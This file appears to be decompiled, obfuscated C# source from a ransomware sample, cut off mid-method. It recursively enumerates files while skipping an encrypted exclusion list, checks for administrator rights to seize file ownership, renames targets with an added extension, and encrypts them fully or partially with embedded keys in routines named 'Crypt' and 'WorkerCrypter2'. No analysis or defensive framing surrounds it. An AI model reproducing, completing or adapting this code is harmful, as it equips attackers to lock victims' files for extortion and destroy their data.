using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using UHNiGjaKzZNxW;

namespace esImVhYKuzS;

internal sealed class jIDJtYejSBzFCRw
{
	public sealed class JMmiYItsDh
	{
		private static StringCollection IwyXrLrThmL;

		private static List<string> caEoufFsLVhZCjW;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107403781));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107403776)) && !text.ToLower().Contains(getString_0(107403787)) && !text.ToLower().Contains(getString_0(107389308)) && !text.ToLower().Contains(getString_0(107389327)) && !text.ToLower().Contains(getString_0(107403742)) && !text.ToLower().Contains(getString_0(107388635)) && !text.ToLower().Contains(getString_0(107388576)) && !text.ToLower().Contains(getString_0(107388591)) && !text.ToLower().Contains(getString_0(107388542)) && !text.ToLower().Contains(getString_0(107388557)) && !text.ToLower().Contains(getString_0(107389035)) && !text.ToLower().Contains(getString_0(107388986)) && !text.ToLower().Contains(getString_0(107388969)) && !text.ToLower().Contains(getString_0(107388956)) && !text.ToLower().Contains(getString_0(107388935)) && !text.ToLower().Contains(getString_0(107388922)) && !text.ToLower().Contains(getString_0(107388941)) && !text.ToLower().Contains(getString_0(107388892)) && !text.ToLower().Contains(getString_0(107388907)) && !text.Contains(NGKPoQcRFBDfbNt(getString_0(107388858))) && !text.Contains(getString_0(107388833)) && !text.Contains(getString_0(107388852)) && !text.EndsWith(getString_0(107395686)) && !text.EndsWith(getString_0(107388795)) && !text.EndsWith(getString_0(107388822)) && !text.EndsWith(getString_0(107388817)) && !text.EndsWith(getString_0(107388812)) && !text.ToLower().Contains(getString_0(107388263)) && !text.ToLower().Contains(RmGQaqoiaBTr))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(mEIFFxHZBgNd) * 1024.0 * 1024.0 && vFJQwHPilYftJL == getString_0(107396763))
							{
								caEoufFsLVhZCjW.Add(text);
							}
							else if (File.Exists(text) && vFJQwHPilYftJL == getString_0(107397020))
							{
								caEoufFsLVhZCjW.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return caEoufFsLVhZCjW;
		}

		static JMmiYItsDh()
		{
			Strings.CreateGetStringDelegate(typeof(JMmiYItsDh));
			IwyXrLrThmL = new StringCollection();
			caEoufFsLVhZCjW = new List<string>();
		}
	}

	private sealed class rOYGTJNEZgsXODRm
	{
		public string lIVyFgCZuhWbAlX;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == lIVyFgCZuhWbAlX;
		}
	}

	private sealed class dYwDIMZVPV
	{
		public string hRJiNuDBwKOTb;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CMapDrv_003Eb__18(int int_0)
		{
			Thread.Sleep(lYuNICMXohCnU);
			hYDYrdRZUMfQ.Add(getString_0(107388196) + hRJiNuDBwKOTb + getString_0(107397200) + (char)int_0 + getString_0(107403760));
			try
			{
				if (pjFetgiEucLksJ)
				{
					Console.WriteLine(getString_0(107388196) + hRJiNuDBwKOTb + getString_0(107397200) + (char)int_0 + getString_0(107403760));
				}
			}
			catch
			{
			}
		}

		static dYwDIMZVPV()
		{
			Strings.CreateGetStringDelegate(typeof(dYwDIMZVPV));
		}
	}

	private sealed class TEcDhinzAemKRbN
	{
		private sealed class wXXJwTHpdnmeYpb
		{
			public TEcDhinzAemKRbN mkEWLqGNrjd;

			public string FYAqswksIKPyn;

			public void _003CCrypt_003Eb__24()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					QuSoHAFJyPPmrXiE(WindowsIdentity.GetCurrent().Name, FYAqswksIKPyn);
				}
			}

			public void _003CCrypt_003Eb__25()
			{
				UGCErsaAKVyhfVi(FYAqswksIKPyn, mkEWLqGNrjd.FhnupdCwUNaCgx, mkEWLqGNrjd.QBQwQLNPJAlZW, mkEWLqGNrjd.hVNCmlFXFbIaX, mkEWLqGNrjd.iTjtsdEEARj);
			}
		}

		public string[] FhnupdCwUNaCgx;

		public string[] hVNCmlFXFbIaX;

		public string iTjtsdEEARj;

		public string QBQwQLNPJAlZW;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__23(string string_0)
		{
			wXXJwTHpdnmeYpb CS_0024_003C_003E8__locals0 = new wXXJwTHpdnmeYpb();
			CS_0024_003C_003E8__locals0.mkEWLqGNrjd = this;
			CS_0024_003C_003E8__locals0.FYAqswksIKPyn = string_0;
			if (ahRifMUVdZFjN && !nMAemjtyDhXALFt().Contains(getString_0(107386099)) && !nMAemjtyDhXALFt().Contains(getString_0(107386470)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						QuSoHAFJyPPmrXiE(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.FYAqswksIKPyn);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (DDyGmAdWrJ == getString_0(107396771))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					UGCErsaAKVyhfVi(CS_0024_003C_003E8__locals0.FYAqswksIKPyn, CS_0024_003C_003E8__locals0.mkEWLqGNrjd.FhnupdCwUNaCgx, CS_0024_003C_003E8__locals0.mkEWLqGNrjd.QBQwQLNPJAlZW, CS_0024_003C_003E8__locals0.mkEWLqGNrjd.hVNCmlFXFbIaX, CS_0024_003C_003E8__locals0.mkEWLqGNrjd.iTjtsdEEARj);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				UGCErsaAKVyhfVi(CS_0024_003C_003E8__locals0.FYAqswksIKPyn, FhnupdCwUNaCgx, QBQwQLNPJAlZW, hVNCmlFXFbIaX, iTjtsdEEARj);
			}
		}

		static TEcDhinzAemKRbN()
		{
			Strings.CreateGetStringDelegate(typeof(TEcDhinzAemKRbN));
		}
	}

	private sealed class NKqHkELnIQFAdV
	{
		private sealed class KcOfYZWbGeBpi
		{
			public NKqHkELnIQFAdV EKHcYJNBcJOCWS;

			public string GOgkaVwGIyZi;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__31()
			{
				foreach (string item in VhmHymKdwdhl)
				{
					if (GOgkaVwGIyZi.ToLower().EndsWith(item + EKHcYJNBcJOCWS.UfmIFRSQHUmOrq) && DqotASAdvjyOTQWi == getString_0(107396782))
					{
						if (Convert.ToInt32(KrPsgnPgWT) * 1024 * 1024 > new FileInfo(GOgkaVwGIyZi).Length)
						{
							try
							{
								WspNJLioodtR.diqCpqybOKjOLc(getString_0(107389264), getString_0(107389291), getString_0(107389278), GOgkaVwGIyZi);
							}
							catch
							{
							}
						}
					}
					else if (GOgkaVwGIyZi.ToLower().EndsWith(item) && DqotASAdvjyOTQWi == getString_0(107397039))
					{
						try
						{
							WspNJLioodtR.diqCpqybOKjOLc(getString_0(107389264), getString_0(107389291), getString_0(107389278), GOgkaVwGIyZi);
						}
						catch
						{
						}
					}
				}
			}

			static KcOfYZWbGeBpi()
			{
				Strings.CreateGetStringDelegate(typeof(KcOfYZWbGeBpi));
			}
		}

		private sealed class RLIRUjhtaFzWnqh
		{
			public NKqHkELnIQFAdV EKHcYJNBcJOCWS;

			public string wKxAvZiJPQtO;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__33()
			{
				foreach (string item in VhmHymKdwdhl)
				{
					if (wKxAvZiJPQtO.ToLower().EndsWith(item + EKHcYJNBcJOCWS.UfmIFRSQHUmOrq) && DqotASAdvjyOTQWi == getString_0(107396785))
					{
						if (Convert.ToInt32(KrPsgnPgWT) * 1024 * 1024 > new FileInfo(wKxAvZiJPQtO).Length)
						{
							try
							{
								WspNJLioodtR.diqCpqybOKjOLc(getString_0(107389267), getString_0(107389294), getString_0(107389281), wKxAvZiJPQtO);
							}
							catch
							{
							}
						}
					}
					else if (wKxAvZiJPQtO.ToLower().EndsWith(item) && DqotASAdvjyOTQWi == getString_0(107397042))
					{
						try
						{
							WspNJLioodtR.diqCpqybOKjOLc(getString_0(107389267), getString_0(107389294), getString_0(107389281), wKxAvZiJPQtO);
						}
						catch
						{
						}
					}
				}
			}

			static RLIRUjhtaFzWnqh()
			{
				Strings.CreateGetStringDelegate(typeof(RLIRUjhtaFzWnqh));
			}
		}

		public List<string> JaKvZGejuOExipBPj;

		public List<string> LVrYlUqqoFMQv;

		public string UfmIFRSQHUmOrq;

		public string[] QFkuNBCHafFJy;

		public string DtfvoUQGiFhnd;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__30(string string_0)
		{
			KcOfYZWbGeBpi CS_0024_003C_003E8__locals0;
			foreach (string item in LVrYlUqqoFMQv)
			{
				if (QFkuNBCHafFJy.Length != 0)
				{
					string[] qFkuNBCHafFJy = QFkuNBCHafFJy;
					int num = 0;
					while (num < qFkuNBCHafFJy.Length)
					{
						string value = qFkuNBCHafFJy[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_09e2;
					}
				}
				try
				{
					if (item.EndsWith(UfmIFRSQHUmOrq))
					{
						goto IL_09e2;
					}
				}
				catch (Exception)
				{
					goto IL_09e2;
				}
				if (!item.EndsWith(string_0) || qiPmErxJQggVfu.Contains(item))
				{
					continue;
				}
				if (LzcJtwyMvPk == getString_0(107396779))
				{
					try
					{
						if (RcKeWyoHTAZmyg.bImTDnckNcn(item))
						{
							RcKeWyoHTAZmyg.WgslsCSGTygL(item);
						}
					}
					catch
					{
					}
				}
				qiPmErxJQggVfu.Add(item);
				if (!FXuQVyDsFHEyD.Contains(Path.GetDirectoryName(item)))
				{
					FXuQVyDsFHEyD.Add(Path.GetDirectoryName(item));
				}
				AmaXDscuvVuN(item);
				try
				{
					new VUCsXWNVIeskrL().jSQKoCNPHlxV(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (pjFetgiEucLksJ)
							{
								Console.WriteLine(getString_0(107403736) + item + getString_0(107403691) + new FileInfo(item).Length + getString_0(107403670));
								Console.WriteLine(getString_0(107403661));
							}
						}
						catch
						{
						}
						nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(getString_0(107403076)), getString_0(107388227) + item + getString_0(107388227) + NGKPoQcRFBDfbNt(getString_0(107403019)) + getString_0(107388227) + Environment.UserName + getString_0(107388227) + NGKPoQcRFBDfbNt(getString_0(107403034)));
					}
				}
				catch (Exception ex2)
				{
					if (yqFjfeWQNnFtS)
					{
						try
						{
							File.AppendAllText(mldgFSRddxG, getString_0(107386241) + item + getString_0(107403009) + ex2.Message + getString_0(107396708));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (yqFjfeWQNnFtS)
						{
							try
							{
								File.AppendAllText(mldgFSRddxG, getString_0(107386241) + item + getString_0(107402896) + ex4.Message + getString_0(107396708));
							}
							catch (Exception)
							{
							}
						}
						IkmoiloXkEwN++;
						goto end_IL_02cd;
					}
					if (gdbMFWmQXamr == getString_0(107396779) && new FileInfo(item).Length > Convert.ToInt32(gFTAyVipGERPhv) * 1024 * 1024 && !JaKvZGejuOExipBPj.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new KcOfYZWbGeBpi();
						CS_0024_003C_003E8__locals0.EKHcYJNBcJOCWS = this;
						try
						{
							if (UfmIFRSQHUmOrq != getString_0(107386447))
							{
								if (YkwjPTGZpc)
								{
									UfmIFRSQHUmOrq = EYBkUQfzxCUj + UfmIFRSQHUmOrq;
								}
								File.Move(item, item + UfmIFRSQHUmOrq);
							}
						}
						catch (Exception ex6)
						{
							if (yqFjfeWQNnFtS)
							{
								try
								{
									File.AppendAllText(mldgFSRddxG, getString_0(107386241) + item + getString_0(107403347) + ex6.Message + getString_0(107396708));
								}
								catch (Exception)
								{
								}
							}
							IkmoiloXkEwN++;
							goto end_IL_02cd;
						}
						CS_0024_003C_003E8__locals0.GOgkaVwGIyZi = getString_0(107389212);
						if (UfmIFRSQHUmOrq != getString_0(107386447))
						{
							CS_0024_003C_003E8__locals0.GOgkaVwGIyZi = item + UfmIFRSQHUmOrq;
						}
						else
						{
							CS_0024_003C_003E8__locals0.GOgkaVwGIyZi = item;
						}
						if (WaGdjztjPUPAi == getString_0(107396779))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in VhmHymKdwdhl)
								{
									if (CS_0024_003C_003E8__locals0.GOgkaVwGIyZi.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.EKHcYJNBcJOCWS.UfmIFRSQHUmOrq) && DqotASAdvjyOTQWi == KcOfYZWbGeBpi.getString_0(107396782))
									{
										if (Convert.ToInt32(KrPsgnPgWT) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.GOgkaVwGIyZi).Length)
										{
											try
											{
												WspNJLioodtR.diqCpqybOKjOLc(KcOfYZWbGeBpi.getString_0(107389264), KcOfYZWbGeBpi.getString_0(107389291), KcOfYZWbGeBpi.getString_0(107389278), CS_0024_003C_003E8__locals0.GOgkaVwGIyZi);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.GOgkaVwGIyZi.ToLower().EndsWith(item2) && DqotASAdvjyOTQWi == KcOfYZWbGeBpi.getString_0(107397039))
									{
										try
										{
											WspNJLioodtR.diqCpqybOKjOLc(KcOfYZWbGeBpi.getString_0(107389264), KcOfYZWbGeBpi.getString_0(107389291), KcOfYZWbGeBpi.getString_0(107389278), CS_0024_003C_003E8__locals0.GOgkaVwGIyZi);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						byte[] bytes = Encoding.ASCII.GetBytes(ydOQhvmvcpZ);
						if (ibVWwozpAGuIfs == getString_0(107397036))
						{
							byte[] array = null;
							byte[] byte_ = nkFelzsRBEm.KQWFCtUZBKxS(CS_0024_003C_003E8__locals0.GOgkaVwGIyZi, Convert.ToInt32(gFTAyVipGERPhv) * 1024 * 1024);
							if (nkFelzsRBEm.AHsEILkRsKltd(uxCXotfEsZFZTBQK: (!ZefUNZPKuQWv) ? (kGnGVVSmVYCjkQ ? nkFelzsRBEm.qpZLeuvzdxLp(byte_, Convert.FromBase64String(DtfvoUQGiFhnd), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : nkFelzsRBEm.qpZLeuvzdxLp(byte_, Convert.FromBase64String(DtfvoUQGiFhnd), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (kGnGVVSmVYCjkQ ? IkRHWwmJhhri.lrXUmqEbANrrJ(byte_, Convert.FromBase64String(DtfvoUQGiFhnd), Convert.FromBase64String(NfvyHzKylGMJES)) : IkRHWwmJhhri.lrXUmqEbANrrJ(byte_, Convert.FromBase64String(DtfvoUQGiFhnd), Convert.FromBase64String(NfvyHzKylGMJES))), nkUKfOqpmmlHAa: CS_0024_003C_003E8__locals0.GOgkaVwGIyZi, arqeKzgafBs: bytes))
							{
								goto IL_09e2;
							}
							try
							{
								File.Move(item + UfmIFRSQHUmOrq, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!kGnGVVSmVYCjkQ)
						{
							if (PzYVJbOTPet.oJAyLxHDaqpVBf(CS_0024_003C_003E8__locals0.GOgkaVwGIyZi, gFTAyVipGERPhv, DtfvoUQGiFhnd, null, Convert.FromBase64String(NfvyHzKylGMJES)))
							{
								goto IL_09e2;
							}
							try
							{
								File.Move(item + UfmIFRSQHUmOrq, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (PzYVJbOTPet.oJAyLxHDaqpVBf(CS_0024_003C_003E8__locals0.GOgkaVwGIyZi, gFTAyVipGERPhv, DtfvoUQGiFhnd, bytes, Convert.FromBase64String(NfvyHzKylGMJES)))
							{
								goto IL_09e2;
							}
							try
							{
								File.Move(item + UfmIFRSQHUmOrq, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (YkwjPTGZpc)
					{
						UfmIFRSQHUmOrq = EYBkUQfzxCUj + UfmIFRSQHUmOrq;
					}
					byte[] bytes2 = Encoding.ASCII.GetBytes(ydOQhvmvcpZ);
					if (UfmIFRSQHUmOrq != getString_0(107386447))
					{
						if (!GPXFyHxJVGs)
						{
							if (!kGnGVVSmVYCjkQ)
							{
								yaxtgGEmAXdl(item, item + UfmIFRSQHUmOrq, kQukpPiiliUKcIy);
							}
							else
							{
								yaxtgGEmAXdl(item, item + UfmIFRSQHUmOrq, Convert.FromBase64String(DtfvoUQGiFhnd));
							}
						}
						else
						{
							try
							{
								if (!kGnGVVSmVYCjkQ)
								{
									oRXdQfZZjJ(item, item + UfmIFRSQHUmOrq, kQukpPiiliUKcIy, Convert.FromBase64String(NfvyHzKylGMJES));
								}
								else
								{
									oRXdQfZZjJ(item, item + UfmIFRSQHUmOrq, Convert.FromBase64String(DtfvoUQGiFhnd), Convert.FromBase64String(NfvyHzKylGMJES));
								}
							}
							catch (Exception ex11)
							{
								if (yqFjfeWQNnFtS)
								{
									try
									{
										File.AppendAllText(mldgFSRddxG, getString_0(107386241) + item + getString_0(107386465) + ex11.Message + getString_0(107396708));
									}
									catch (Exception)
									{
									}
								}
								IkmoiloXkEwN++;
								try
								{
									File.Move(item + UfmIFRSQHUmOrq, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_02cd;
							}
						}
					}
					else if (!GPXFyHxJVGs)
					{
						if (!kGnGVVSmVYCjkQ)
						{
							yaxtgGEmAXdl(item, item + getString_0(107386442), kQukpPiiliUKcIy);
						}
						else
						{
							yaxtgGEmAXdl(item, item + getString_0(107386442), Convert.FromBase64String(DtfvoUQGiFhnd));
						}
					}
					else
					{
						try
						{
							if (!kGnGVVSmVYCjkQ)
							{
								oRXdQfZZjJ(item, item, kQukpPiiliUKcIy, Convert.FromBase64String(NfvyHzKylGMJES));
							}
							else
							{
								oRXdQfZZjJ(item, item, Convert.FromBase64String(DtfvoUQGiFhnd), Convert.FromBase64String(NfvyHzKylGMJES));
							}
						}
						catch (Exception ex14)
						{
							if (yqFjfeWQNnFtS)
							{
								try
								{
									File.AppendAllText(mldgFSRddxG, getString_0(107386241) + item + getString_0(107386465) + ex14.Message + getString_0(107396708));
								}
								catch (Exception)
								{
								}
							}
							IkmoiloXkEwN++;
							goto end_IL_02cd;
						}
					}
					if (kGnGVVSmVYCjkQ)
					{
						if (UfmIFRSQHUmOrq != getString_0(107386447))
						{
							coknNVwPlVpucD(item + UfmIFRSQHUmOrq, bytes2);
						}
						else
						{
							coknNVwPlVpucD(item, bytes2);
						}
					}
					goto IL_09e2;
					end_IL_02cd:;
				}
				catch (Exception)
				{
					goto IL_09e2;
				}
				continue;
				IL_09e2:
				LVrYlUqqoFMQv.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__32(string string_0)
		{
			RLIRUjhtaFzWnqh CS_0024_003C_003E8__locals0 = new RLIRUjhtaFzWnqh();
			CS_0024_003C_003E8__locals0.EKHcYJNBcJOCWS = this;
			CS_0024_003C_003E8__locals0.wKxAvZiJPQtO = string_0;
			if (QFkuNBCHafFJy.Length != 0)
			{
				string[] qFkuNBCHafFJy = QFkuNBCHafFJy;
				int num = 0;
				while (num < qFkuNBCHafFJy.Length)
				{
					string value = qFkuNBCHafFJy[num];
					if (!CS_0024_003C_003E8__locals0.wKxAvZiJPQtO.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0ac2;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.wKxAvZiJPQtO.EndsWith(UfmIFRSQHUmOrq))
				{
					goto IL_0ac2;
				}
			}
			catch (Exception)
			{
				goto IL_0ac2;
			}
			if (!qiPmErxJQggVfu.Contains(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO))
			{
				if (LzcJtwyMvPk == getString_0(107396779))
				{
					try
					{
						if (RcKeWyoHTAZmyg.bImTDnckNcn(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO))
						{
							RcKeWyoHTAZmyg.WgslsCSGTygL(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
						}
					}
					catch
					{
					}
				}
				qiPmErxJQggVfu.Add(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
				if (!FXuQVyDsFHEyD.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO)))
				{
					FXuQVyDsFHEyD.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO));
				}
				AmaXDscuvVuN(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
				try
				{
					new VUCsXWNVIeskrL().jSQKoCNPHlxV(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (pjFetgiEucLksJ)
							{
								Console.WriteLine(getString_0(107403736) + CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + getString_0(107403691) + new FileInfo(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO).Length + getString_0(107403670));
								Console.WriteLine(getString_0(107403661));
							}
						}
						catch
						{
						}
						nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(getString_0(107403076)), getString_0(107388227) + CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + getString_0(107388227) + NGKPoQcRFBDfbNt(getString_0(107403019)) + getString_0(107388227) + Environment.UserName + getString_0(107388227) + NGKPoQcRFBDfbNt(getString_0(107403034)));
					}
				}
				catch (Exception ex2)
				{
					if (yqFjfeWQNnFtS)
					{
						try
						{
							File.AppendAllText(mldgFSRddxG, getString_0(107386241) + CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + getString_0(107403009) + ex2.Message + getString_0(107396708));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (yqFjfeWQNnFtS)
						{
							try
							{
								File.AppendAllText(mldgFSRddxG, getString_0(107386241) + CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + getString_0(107402896) + ex4.Message + getString_0(107396708));
							}
							catch (Exception)
							{
							}
						}
						IkmoiloXkEwN++;
						goto end_IL_031d_2;
					}
					if (gdbMFWmQXamr == getString_0(107396779) && new FileInfo(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO).Length > Convert.ToInt32(gFTAyVipGERPhv) * 1024 * 1024)
					{
						try
						{
							if (UfmIFRSQHUmOrq != getString_0(107386447))
							{
								if (YkwjPTGZpc)
								{
									UfmIFRSQHUmOrq = EYBkUQfzxCUj + UfmIFRSQHUmOrq;
								}
								File.Move(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + UfmIFRSQHUmOrq);
							}
						}
						catch (Exception ex6)
						{
							if (yqFjfeWQNnFtS)
							{
								try
								{
									File.AppendAllText(mldgFSRddxG, getString_0(107386241) + CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + getString_0(107403347) + ex6.Message + getString_0(107396708));
								}
								catch (Exception)
								{
								}
							}
							IkmoiloXkEwN++;
							return;
						}
						if (UfmIFRSQHUmOrq != getString_0(107386447))
						{
							CS_0024_003C_003E8__locals0.wKxAvZiJPQtO += UfmIFRSQHUmOrq;
						}
						if (WaGdjztjPUPAi == getString_0(107396779))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in VhmHymKdwdhl)
								{
									if (CS_0024_003C_003E8__locals0.wKxAvZiJPQtO.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.EKHcYJNBcJOCWS.UfmIFRSQHUmOrq) && DqotASAdvjyOTQWi == RLIRUjhtaFzWnqh.getString_0(107396785))
									{
										if (Convert.ToInt32(KrPsgnPgWT) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO).Length)
										{
											try
											{
												WspNJLioodtR.diqCpqybOKjOLc(RLIRUjhtaFzWnqh.getString_0(107389267), RLIRUjhtaFzWnqh.getString_0(107389294), RLIRUjhtaFzWnqh.getString_0(107389281), CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.wKxAvZiJPQtO.ToLower().EndsWith(item) && DqotASAdvjyOTQWi == RLIRUjhtaFzWnqh.getString_0(107397042))
									{
										try
										{
											WspNJLioodtR.diqCpqybOKjOLc(RLIRUjhtaFzWnqh.getString_0(107389267), RLIRUjhtaFzWnqh.getString_0(107389294), RLIRUjhtaFzWnqh.getString_0(107389281), CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						byte[] bytes = Encoding.ASCII.GetBytes(ydOQhvmvcpZ);
						if (ibVWwozpAGuIfs == getString_0(107397036))
						{
							byte[] array = null;
							byte[] byte_ = nkFelzsRBEm.KQWFCtUZBKxS(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, Convert.ToInt32(gFTAyVipGERPhv) * 1024 * 1024);
							if (!nkFelzsRBEm.AHsEILkRsKltd(uxCXotfEsZFZTBQK: (!ZefUNZPKuQWv) ? (kGnGVVSmVYCjkQ ? nkFelzsRBEm.qpZLeuvzdxLp(byte_, Convert.FromBase64String(DtfvoUQGiFhnd), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : nkFelzsRBEm.qpZLeuvzdxLp(byte_, Convert.FromBase64String(DtfvoUQGiFhnd), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (kGnGVVSmVYCjkQ ? IkRHWwmJhhri.lrXUmqEbANrrJ(byte_, Convert.FromBase64String(DtfvoUQGiFhnd), Convert.FromBase64String(NfvyHzKylGMJES)) : IkRHWwmJhhri.lrXUmqEbANrrJ(byte_, Convert.FromBase64String(DtfvoUQGiFhnd), Convert.FromBase64String(NfvyHzKylGMJES))), nkUKfOqpmmlHAa: CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, arqeKzgafBs: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + UfmIFRSQHUmOrq, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!kGnGVVSmVYCjkQ)
						{
							if (!PzYVJbOTPet.oJAyLxHDaqpVBf(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, gFTAyVipGERPhv, DtfvoUQGiFhnd, null, Convert.FromBase64String(NfvyHzKylGMJES)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + UfmIFRSQHUmOrq, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!PzYVJbOTPet.oJAyLxHDaqpVBf(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, gFTAyVipGERPhv, DtfvoUQGiFhnd, bytes, Convert.FromBase64String(NfvyHzKylGMJES)))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + UfmIFRSQHUmOrq, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (YkwjPTGZpc)
						{
							UfmIFRSQHUmOrq = EYBkUQfzxCUj + UfmIFRSQHUmOrq;
						}
						byte[] bytes2 = Encoding.ASCII.GetBytes(ydOQhvmvcpZ);
						if (UfmIFRSQHUmOrq != getString_0(107386447))
						{
							if (!GPXFyHxJVGs)
							{
								if (!kGnGVVSmVYCjkQ)
								{
									yaxtgGEmAXdl(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + UfmIFRSQHUmOrq, kQukpPiiliUKcIy);
								}
								else
								{
									yaxtgGEmAXdl(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + UfmIFRSQHUmOrq, Convert.FromBase64String(DtfvoUQGiFhnd));
								}
							}
							else
							{
								try
								{
									if (!kGnGVVSmVYCjkQ)
